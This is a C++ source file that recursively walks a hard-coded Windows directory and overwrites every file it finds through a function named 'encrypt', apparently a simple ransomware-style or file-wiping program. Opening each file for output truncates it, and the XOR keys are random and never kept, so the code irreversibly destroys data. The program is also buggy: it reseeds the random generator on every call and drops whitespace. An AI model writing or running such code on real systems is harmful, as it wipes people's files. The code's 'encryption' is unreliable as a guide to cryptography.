#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <time.h>

namespace fs = std::filesystem;

void listFiles(fs::path);
int genKey();
std::string xorString(std::string);
void traverseDir(fs::path);
void encrypt(fs::path);

int main()
{
	fs::path rootPath = fs::path("C:\\directory");
	traverseDir(rootPath);
	std::cout << "All done!";
	return 0;
}
void traverseDir(fs::path rootPath)
{
	for(const auto entry : fs::directory_iterator(rootPath))
	{
		if(entry.exists())
		{
			if(entry.is_regular_file() || entry.is_other())
			{
				// std::cout << entry.path() << std::endl;
				encrypt(entry.path());
			}
			else if(entry.is_directory())
			{
				rootPath = entry.path();
				traverseDir(entry.path());
			}
		}
	}
}
void encrypt(fs::path path)
{
	std::ifstream FileIn(path);
	std::ofstream FileOut(path);
	std::string input;
	std::string output;
	if(FileIn.is_open())
	{
		while (FileIn >> input)
		{
			output = xorString(input);
			FileOut << output;
		}
	}
	else std::cout << "Oh no!\n";
	FileIn.close();
	FileOut.close();
	std::cout << "Done!\n";
}
int genKey()
{
	srand(time(NULL));
	return rand() % 256;
}
std::string xorString(std::string input)
{
	int key;
	std::string output = input;
	for(int i = 0; i < output.length(); i++)
	{
		key = genKey();
		output[i] ^= key;
	}
	return output;
}
